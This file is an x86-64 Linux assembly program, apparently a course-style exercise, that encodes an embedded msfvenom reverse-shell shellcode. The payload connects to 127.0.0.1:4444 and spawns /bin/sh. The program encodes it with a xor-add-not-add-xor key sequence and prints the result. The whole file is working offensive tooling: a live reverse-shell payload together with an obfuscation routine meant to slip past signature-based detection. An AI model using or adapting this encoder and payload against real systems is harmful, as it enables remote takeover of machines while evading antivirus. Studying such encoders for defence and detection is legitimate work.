; Date: 08/04/2019
; XANAX Encoder
; Author: Alan Vivona
; Description: Uses xor-add-not-add-xor sequence with a 4 byte key and writes the encoded version to stdout
; Tested on: x86-x64 GNU/Linux

global _start

segment .data

    keys.xor1 equ 0x29
    keys.add1 equ 0xff
    keys.xor2 equ 0x50
    keys.add2 equ 0x05

    payload.len equ 74 ; this can't be over 127 bytes otherwise it will produce nullbytes

    ; msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp -f hex
    payload_start: db  0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05


section .text

_start:

    encode_setup:
    xor rcx, rcx
    lea rsi, [payload_start]
    encode:
        mov al, byte [rsi+rcx]
        ; XANAX encoding (xor add not add xor)
        xor al, keys.xor1
        add al, keys.add1
        not al
        add al, keys.add2
        xor al, keys.xor2
        mov byte [rsi+rcx], al

        inc rcx
        cmp rcx, payload.len
        jne encode

    ; Write
    push 0x01
    pop rax
    mov rdi, rax ; fd 1 = stdout
        ; rsi = [payload_start] from the code above, no need for setting that again
    push payload.len
    pop rdx
    syscall

    ; Exit
    xor rbx, rbx
    push 0x3c
    pop rax
    syscall